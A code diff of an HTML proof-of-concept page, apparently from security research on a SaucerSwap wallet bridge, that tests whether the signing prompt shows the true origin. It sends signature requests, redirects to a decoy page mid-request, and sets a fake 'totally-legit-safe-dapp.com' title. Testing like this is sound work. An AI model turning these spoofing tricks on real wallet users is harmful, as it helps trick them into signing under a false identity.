@@ -1,32 +1,49 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>SaucerSwap Wallet Bridge PoC Test Page</h1>
-<button onclick="testConnect()">Test Connect</button>
-<button onclick="testSign()">Test Sign Message</button>
+<h1>SaucerSwap Wallet Bridge PoC — Domain Spoof Test</h1>
+<button onclick="testNormalSign()">1. Baseline: Normal Sign</button>
+<button onclick="testRedirectSign()">2. Sign + Immediate Redirect</button>
+<button onclick="testTitleSpoof()">3. Sign + Title Change</button>
 <pre id="log"></pre>
 
 <script>
 function log(msg) {
-  document.getElementById('log').textContent += msg + "\n";
+  document.getElementById('log').textContent += new Date().toISOString() + " - " + msg + "\n";
 }
 
-function testConnect() {
-  log("Calling window.saucerswapWallet.connect()...");
-  if (!window.saucerswapWallet) {
-    log("saucerswapWallet not found on window.");
-    return;
-  }
-  window.saucerswapWallet.connect()
-    .then(result => log("connect() resolved: " + JSON.stringify(result)))
-    .catch(err => log("connect() rejected: " + err.message));
+// Test 1: baseline, same as before, for comparison
+function testNormalSign() {
+  log("Baseline call from: " + window.location.href);
+  window.saucerswapWallet.signMessage("Baseline test - normal call, no manipulation")
+    .then(r => log("resolved: " + JSON.stringify(r)))
+    .catch(e => log("rejected: " + e.message));
 }
 
-function testSign() {
-  log("Calling window.saucerswapWallet.signMessage()...");
-  window.saucerswapWallet.signMessage("PoC test message - harmless, for security research only")
-    .then(result => log("signMessage() resolved: " + JSON.stringify(result)))
-    .catch(err => log("signMessage() rejected: " + err.message));
+// Test 2: call signMessage, then immediately navigate away
+// This tests whether the approval sheet captures the URL at call-time
+// (correct) or at some later render-time (potentially stale/wrong)
+function testRedirectSign() {
+  log("Calling signMessage from: " + window.location.href);
+  window.saucerswapWallet.signMessage("Redirect test - page will navigate immediately after this call")
+    .then(r => log("resolved: " + JSON.stringify(r)))
+    .catch(e => log("rejected: " + e.message));
+
+  // Redirect immediately after firing the request, before any response
+  setTimeout(function() {
+    log("Navigating away now...");
+    window.location.href = window.location.origin + "/decoy.html";
+  }, 50); // small delay just to ensure the postMessage had a chance to fire first
+}
+
+// Test 3: change the page title right before calling, in case the
+// sheet derives any display info from page metadata rather than the real URL
+function testTitleSpoof() {
+  document.title = "totally-legit-safe-dapp.com (Official)";
+  log("Changed document.title, now calling signMessage...");
+  window.saucerswapWallet.signMessage("Title spoof test")
+    .then(r => log("resolved: " + JSON.stringify(r)))
+    .catch(e => log("rejected: " + e.message));
 }
 </script>
 </body>
